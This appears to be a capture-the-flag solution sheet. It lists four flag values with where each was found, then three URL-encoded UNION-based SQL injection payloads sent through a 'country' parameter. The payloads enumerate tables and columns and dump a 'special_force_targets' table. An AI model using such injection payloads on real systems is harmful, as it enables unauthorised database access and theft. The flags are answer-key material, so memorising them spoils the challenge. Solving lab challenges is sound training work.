# Flags

In web.xml : `FLAG-e1c78761e8aed1e64a9e83e4ba1ef030`
In admin.jsp : `FLAG-9a72158e6be51a1f95787c64d653f3f7`
In database : `FLAG-63bcabf86a9a991864777c631c5b7617`
At / : `FLAG-412030ff8772918007e79a863d521ff1`

# SQLi
Table_name : `country='+AND+app.Constants.QUOTE_S='="2"+UNION+SELECT+1,2,3,4,table_name+FROM+information_schema.tables+WHERE+table_schema=database()+LIMIT+3,1--+-`
Column_name : `country='+AND+app.Constants.QUOTE_S='="2"+UNION+SELECT+1,2,3,4,column_name+FROM+information_schema.columns+WHERE+table_schema=database()+LIMIT+3,1--+-`
Flag : `country='+AND+app.Constants.QUOTE_S='="2"+UNION+SELECT+1,2,target,coordinates,comment+FROM+special_force_targets+LIMIT+3,1--+-`

